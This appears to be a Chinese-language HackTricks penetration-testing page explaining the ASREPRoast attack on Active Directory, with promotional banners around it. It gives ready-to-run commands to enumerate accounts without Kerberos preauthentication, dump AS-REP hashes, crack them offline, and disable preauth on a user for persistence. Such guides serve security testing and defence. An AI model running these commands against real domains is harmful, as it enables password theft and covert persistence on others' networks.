# ASREPRoast

<details>

<summary><strong>零基础学习AWS黑客攻击直至成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您希望在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。**

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

加入[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy)服务器，与经验丰富的黑客和漏洞赏金猎人交流！

**黑客洞察**\
深入了解黑客的刺激和挑战

**实时黑客新闻**\
通过实时新闻和洞察，跟上快节奏的黑客世界

**最新公告**\
通过最新的漏洞赏金发布和关键平台更新，保持信息的更新

**加入我们的** [**Discord**](https://discord.com/invite/N3FrSbmwdy) 并立即开始与顶尖黑客合作！

## ASREPRoast

ASREPRoast攻击寻找**没有设置Kerberos预认证要求属性的用户（**[_**DONT\_REQ\_PREAUTH**_](https://support.microsoft.com/en-us/help/305144/how-to-use-the-useraccountcontrol-flags-to-manipulate-user-account-pro)_**）**。

这意味着任何人都可以代表这些用户向DC发送AS\_REQ请求，并收到AS\_REP消息。这最后一种消息包含了一块用原始用户密钥加密的数据，该密钥来自其密码。然后，使用这个消息，用户密码可以离线破解。

此外，**执行此攻击不需要域账户**，只需要连接到DC。然而，**有了域账户**，可以使用LDAP查询在域中**检索没有Kerberos预认证的用户**。**否则用户名必须猜测**。

#### 枚举易受攻击的用户（需要域凭证）

{% code title="使用Windows" %}
```bash
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```
```
{% endcode %}

{% code title="使用Linux" %}
```
```bash
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
```markdown
{% endcode %}

#### 请求 AS\_REP 消息

{% code title="使用 Linux" %}
```
```bash
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```
```
{% endcode %}

{% code title="使用Windows" %}
```
```bash
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
{% endcode %}

{% hint style="warning" %}
使用 Rubeus 进行 AS-REP Roasting 会生成一个加密类型为 0x17 和预认证类型为 0 的 4768。
{% endhint %}

### 破解
```
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```
### 持久性

对于您拥有 **GenericAll** 权限（或有权写入属性）的用户，强制不需要 **preauth**：

{% code title="使用 Windows" %}
```bash
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```
```
{% endcode %}

{% code title="使用Linux" %}
```
```bash
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH
```
## 参考资料

[**关于 AS-REP Roasting 的更多信息请见 ired.team**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

加入 [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) 服务器，与经验丰富的黑客和漏洞赏金猎人交流！

**黑客洞察**\
深入探讨黑客的刺激和挑战

**实时黑客新闻**\
通过实时新闻和洞察了解快节奏的黑客世界

**最新公告**\
通过最新的漏洞赏金发布和关键平台更新保持信息更新

**加入我们的** [**Discord**](https://discord.com/invite/N3FrSbmwdy) 并开始与顶尖黑客合作！

<details>

<summary><strong>从零开始学习 AWS 黑客技术，成为</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>！</strong></summary>

支持 HackTricks 的其他方式：

* 如果您希望在 **HackTricks 中看到您的公司广告** 或 **下载 HackTricks 的 PDF 版本**，请查看 [**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 发现 [**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的 [**NFT 集合**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** 🐦 上 **关注** 我 **@carlospolopm**。
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来 **分享您的黑客技巧**。

</details>
